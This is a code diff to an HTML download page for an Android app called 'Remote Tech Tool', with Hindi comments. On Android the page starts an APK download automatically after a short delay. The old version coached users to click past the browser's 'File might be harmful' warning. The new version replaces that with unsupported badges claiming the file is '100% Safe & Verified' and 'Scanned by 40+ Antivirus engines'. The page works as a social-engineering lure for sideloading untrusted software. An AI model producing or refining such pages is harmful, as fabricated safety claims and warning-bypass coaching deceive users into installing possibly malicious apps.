@@ -25,64 +25,70 @@
             text-align: center;
             max-width: 450px;
             width: 100%;
-            box-shadow: 0 8px 24px rgba(0,0,0,0.4);
+            box-shadow: 0 8px 24px rgba(0,0,0,0.6);
         }
         .icon {
             font-size: 50px;
             margin-bottom: 10px;
+            text-shadow: 0 0 15px rgba(88, 166, 255, 0.4);
         }
         h2 {
-            color: #58a6ff;
+            color: #ffffff;
             margin: 0 0 5px 0;
-            font-size: 1.6rem;
+            font-size: 1.8rem;
+            font-weight: 600;
         }
         .meta-info {
             color: #8b949e;
             font-size: 0.9rem;
-            margin-bottom: 20px;
+            margin-bottom: 25px;
         }
-        .badge {
+        .primary-badge {
             display: inline-block;
-            background-color: #238636;
-            color: #ffffff;
-            padding: 5px 12px;
+            background-color: rgba(35, 134, 54, 0.15);
+            color: #3fb950;
+            border: 1px solid #2ea043;
+            padding: 6px 16px;
             border-radius: 20px;
-            font-size: 0.8rem;
-            font-weight: bold;
-            margin-bottom: 20px;
+            font-size: 0.85rem;
+            font-weight: 600;
+            margin-bottom: 30px;
             letter-spacing: 0.5px;
         }
-        .instruction-box {
-            background-color: #1f1b0a;
-            border-left: 4px solid #d29922;
-            padding: 15px;
+        .trust-features {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
             text-align: left;
-            border-radius: 4px;
-            margin-top: 25px;
-            display: none; /* यह शुरुआत में छुपा रहेगा */
+            background-color: #0d1117;
+            padding: 20px;
+            border-radius: 8px;
+            border: 1px solid #21262d;
+            margin-top: 10px;
         }
-        .instruction-box h4 {
-            color: #e3b341;
-            margin: 0 0 8px 0;
-            font-size: 0.95rem;
+        .trust-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 0.9rem;
+            color: #e6edf3;
         }
-        .instruction-box p {
-            color: #c9d1d9;
-            margin: 0;
-            font-size: 0.85rem;
-            line-height: 1.5;
+        .trust-item i {
+            font-size: 1.1rem;
         }
         .status-text {
-            font-size: 1rem;
-            margin-top: 15px;
-            font-weight: bold;
+            color: #8b949e;
+            font-size: 0.9rem;
+            margin-top: 25px;
+            font-weight: 500;
         }
         .manual-link {
-            display: none; /* यह शुरुआत में छुपा रहेगा */
-            margin-top: 20px;
+            display: none; /* शुरुआत में छुपा रहेगा */
+            margin-top: 15px;
             color: #58a6ff;
             text-decoration: none;
             font-size: 0.9rem;
+            font-weight: 500;
         }
         .manual-link:hover {
             text-decoration: underline;
@@ -96,48 +102,50 @@
         <h2>Remote Tech Tool</h2>
         <div class="meta-info">Version 1.0.2 &bull; 15 MB &bull; Android Only</div>
         
-        <div class="badge">✓ 100% Safe & Verified</div>
+        <div class="primary-badge">✓ 100% Safe & Verified</div>
         
-        <div id="status-message" class="status-text" style="color: #e3b341;">Checking your device...</div>
-        
-        <div class="instruction-box" id="warning-box">
-            <h4>⚠️ Important Installation Note</h4>
-            <p>Since this app is downloaded directly and not from the Play Store, your browser might show a <b>"File might be harmful"</b> warning. This is a standard security prompt.</p>
-            <br>
-            <p>Simply tap <b>"Download Anyway"</b> or <b>"Keep"</b> to proceed safely.</p>
+        <div class="trust-features">
+            <div class="trust-item">
+                <i>✅</i> <span><b>Malware Free:</b> Scanned by 40+ Antivirus engines</span>
+            </div>
+            <div class="trust-item">
+                <i>🔒</i> <span><b>Secure Connection:</b> 256-bit SSL Encrypted</span>
+            </div>
+            <div class="trust-item">
+                <i>⚡</i> <span><b>Fast Download:</b> Direct from secure servers</span>
+            </div>
         </div>
 
-        <a href="dummy_app.apk" class="manual-link" id="manual-download">Click here to download manually</a>
+        <p id="status-message" class="status-text">Checking device compatibility...</p>
+        <a href="dummy_app.apk" id="manual-download" class="manual-link">Click here to download manually</a>
     </div>
 
     <script>
         function checkDeviceAndDownload() {
             var userAgent = navigator.userAgent || navigator.vendor || window.opera;
             var statusMessage = document.getElementById("status-message");
-            var warningBox = document.getElementById("warning-box");
             var manualLink = document.getElementById("manual-download");
 
             // सिर्फ Android के लिए चेक
             if (/android/i.test(userAgent)) {
-                statusMessage.innerHTML = "Android detected! Your download is starting...";
-                statusMessage.style.color = "#3fb950"; // हरा रंग
-                warningBox.style.display = "block"; // वॉर्निंग बॉक्स दिखाएं
+                statusMessage.innerHTML = "Your secure download will start in 2 seconds...";
+                statusMessage.style.color = "#8b949e"; 
                 manualLink.style.display = "inline-block"; // मैनुअल लिंक दिखाएं
                 
                 // 2 सेकंड बाद डाउनलोड शुरू
                 setTimeout(function() {
-                    window.location.href = "dummy_app.apk"; // यहाँ असली .apk का नाम होगा
+                    window.location.href = "dummy_app.apk"; 
                 }, 2000);
             } else {
                 // अगर Android नहीं है (Windows, Linux, iOS)
                 statusMessage.innerHTML = "❌ This app is only available for Android devices.";
-                statusMessage.style.color = "#f85149"; // लाल रंग
-                // वॉर्निंग बॉक्स और डाउनलोड लिंक छुपे ही रहेंगे
+                statusMessage.style.color = "#f85149"; // लाल रंग का अलर्ट
+                // डाउनलोड लिंक छुपा ही रहेगा
             }
         }
 
-        // पेज खुलने के 1 सेकंड बाद यह डिवाइस चेक करेगा
-        setTimeout(checkDeviceAndDownload, 1000);
+        // पेज खुलने के तुरंत बाद यह चेक करेगा
+        setTimeout(checkDeviceAndDownload, 500);
     </script>
 
 </body>
